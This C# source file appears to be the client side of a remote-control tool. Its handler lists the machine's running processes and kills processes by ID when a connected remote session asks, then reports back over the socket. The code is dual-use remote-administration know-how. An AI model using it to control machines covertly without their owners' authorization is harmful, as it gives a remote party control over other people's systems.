using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;
using System.Threading;
using System.IO;
using RemoteControl.Protocals.Utilities;
using System.Diagnostics;

namespace RemoteControl.Client
{
    class RequestGetProcessesHandler : IRequestHandler
    {
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            if (reqType == ePacketType.PACKET_GET_PROCESSES_REQUEST)
            {
                var req = reqObj as RequestGetProcesses;
                new Thread(() => StartGetProcesses(session, req)) {IsBackground = true}.Start();
            }
            else if (reqType == ePacketType.PACKET_KILL_PROCESS_REQUEST)
            {
                var req = reqObj as RequestKillProcesses;
                new Thread(() =>
                {
                    StartKillProcesses(session, req);
                    StartGetProcesses(session, new RequestGetProcesses(){IsSimpleMode = true});
                }) { IsBackground = true }.Start();
            }
        }

        static void StartGetProcesses(SocketSession session, RequestGetProcesses req)
        {
            ResponseGetProcesses resp = new ResponseGetProcesses();

            try
            {
                List<ProcessProperty> processes = null;
                if (req.IsSimpleMode)
                {
                    processes = ProcessUtil.GetProcessProperyListBySimple();
                }
                else
                {
                    processes = ProcessUtil.GetProcessProperyList();                    
                }
                resp.Processes = processes.OrderBy(s => s.ProcessName).ToList();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }

            session.Send(ePacketType.PACKET_GET_PROCESSES_RESPONSE, resp);
        }

        static void StartKillProcesses(SocketSession session, RequestKillProcesses req)
        {
            var processList = Process.GetProcesses().ToList();
            for (int i = 0; i < req.ProcessIds.Count; i++)
            {
                string processId = req.ProcessIds[i];
                try
                {
                    Process p = processList.Find(m => m.Id.ToString() == processId);
                    if (p == null)
                        continue;

                    p.Kill();
                }
                catch (Exception ex)
                {
                }
            }
        }
    }
}
